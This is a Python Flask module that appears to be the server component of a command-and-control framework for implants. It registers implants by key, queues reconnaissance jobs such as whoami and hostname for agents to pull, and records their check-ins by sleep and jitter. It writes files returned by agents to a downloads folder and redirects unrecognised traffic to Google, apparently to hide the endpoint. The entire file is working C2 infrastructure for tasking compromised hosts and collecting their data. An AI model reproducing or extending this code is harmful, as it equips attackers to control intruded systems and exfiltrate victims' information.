import datetime
import json
import os

from connect.server.models import db, StagerModel, AgentModel, JobModel, ImplantModel
from connect.generate import digit_identifier, string_identifier
from connect.output import print_traceback, print_error
from connect.convert import base64_to_string, base64_to_bytes, string_to_base64
from flask_socketio import emit, disconnect, SocketIO
from flask import Blueprint, request, jsonify, redirect

check_in = Blueprint('check_in', __name__)
key = digit_identifier()
websocket = SocketIO(max_http_buffer_size=1e10)


def _commit(models: list):
    """
    Commits model object changes to the database.

    :param models: A list of models.
    """
    for model in models:
        db.session.add(model)
    db.session.commit()


def _retrieve_error(job, error):
    job.result = error['message']
    job.completed = datetime.datetime.now()
    _commit([job])


def _retrieve_results(job, result):
    agent = job.agent

    # A batch result is reserved to set agent properties.
    if isinstance(result, list):
        _result = result[0]
        _property = base64_to_string(result[1])
        if job.name == 'hostname':
            agent.hostname = _property
        if job.name == 'whoami':
            agent.username = _property
        if job.name == 'pid':
            agent.pid = _property
        if job.name == 'integrity':
            agent.integrity = _property
        if job.name == 'set sleep':
            agent.sleep = _property
        if job.name == 'set jitter':
            agent.jitter = _property
    else:
        _result = result

    if job.type == 1 or job.type == -1:
        job.results = base64_to_string(_result)
        websocket.emit('job_results', f'{{"banner":"{job.name.title()} job results from {agent.name}:",'
                                      f'"results":"{_result}"}}')
    if job.type == 2 or job.type == -2:
        file = base64_to_bytes(_result)
        filename = f'{os.getcwd()}/connect/server/downloads/{string_identifier()}'
        job.results = filename
        with open(filename, 'wb') as fd:
            fd.write(file)
        websocket.emit('job_results', f'{{"banner":"Wrote {job.name.title()} job results from {agent.name} to:",'
                                      f'"results":"{string_to_base64(filename)}"}}')
    job.completed = datetime.datetime.now()
    _commit([agent, job])


def _connected_notification(agent):
    time_delta = (datetime.datetime.now() - agent.check_in)
    max_delay = (float(agent.sleep) * (float(agent.jitter) / 100)) + float(agent.sleep)
    if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in or \
            time_delta.total_seconds() > (max_delay + 10.0):
        websocket.emit('connected', f'{agent.name} is connected', broadcast=False)
    agent.check_in = datetime.datetime.now()
    _commit([agent])


def _retrieve_unsent_jobs(job):
    """
    If the job is a check_in then we need to grab uncompleted jobs for the agent.

    :param job:
    :return:
    """
    _unsent_jobs = []
    agent = job.agent
    _connected_notification(agent)
    for unsent_job in agent.jobs:
        if unsent_job.sent:
            continue
        websocket.emit('job_sent', f'Sent job {unsent_job.name.title()} to {agent.name}')
        unsent_job.sent = datetime.datetime.now()
        _commit([unsent_job])
        _unsent_jobs.append({"jsonrpc": "2.0", "name": unsent_job.name, "arguments": unsent_job.arguments,
                             "id": str(unsent_job.identifier)})
    return _unsent_jobs


@check_in.route('/<path:uri>', methods=['GET', 'POST'])
def endpoint(uri):
    """
    The check_in endpoint for agents and implants.

    :param uri: The URI requested.
    """
    implant_key = request.get_data().decode('utf-8')
    implant = ImplantModel.query.filter_by(key=implant_key).first()
    if implant:
        agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
        check_in_job = JobModel(name='check_in', agent=agent, type=-1)
        check_in_job.completed = datetime.datetime.now()
        check_in_job.sent = datetime.datetime.now()
        _commit([agent, check_in_job])
        batch_request = [{"jsonrpc": "2.0", "name": check_in_job.name, "arguments": check_in_job.arguments,
                          "id": str(check_in_job.identifier)}]
        return jsonify(batch_request)

    try:
        batch_response = request.get_json(force=True)
    except Exception as e:
        print_error(f'Failed to parse JSON-RPC 2.0 Batch Response: {request.get_data()} {uri} : {e}')
        return redirect("https://www.google.com")

    try:
        batch_request = []
        for job in batch_response:
            job_id = job['id'] if 'id' in job.keys() else None
            job_result = job['result'] if 'result' in job.keys() else None
            job_error = job['error'] if 'error' in job.keys() else None
            job = JobModel.query.filter_by(identifier=job_id).first()
            if not job:
                return redirect("https://www.google.com")
            if job_result:
                _retrieve_results(job, job_result)
            if job_error:
                _retrieve_error(job, job_error)
            if job.name == 'check_in':
                batch_request.extend(_retrieve_unsent_jobs(job))
        return jsonify(batch_request)
    except Exception:
        print_traceback()


def connect(auth):
    """
    This event is triggered on client connection requests.
    If the authentication data does not match the generated key,
    then a disconnect event is triggered.

    :param auth:
    """
    if not auth == key:
        disconnect()


def agents():
    """
    This event emits all current agents within the database to the client.
    """
    _agents = [agent.get_agent() for agent in AgentModel.query.all()]
    emit('agents', {'agents': _agents}, broadcast=False)


def stagers():
    """
    This event emits all current stagers within the database to the client.
    """
    _stagers = [stager.get_stager() for stager in StagerModel.query.all()]
    emit('stagers', {'stagers': _stagers, 'server_uri': request.host_url}, broadcast=False)


def new_job(data):
    """
    This event schedules a new job to be sent to the agent.
    The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}

    :param data:
    """
    data = json.loads(data)
    agent = AgentModel.query.filter_by(name=data['agent_name']).first()
    job = JobModel(name=data['name'], agent=agent, arguments=data['arguments'], type=data['type'])
    db.session.add(job)
    db.session.commit()
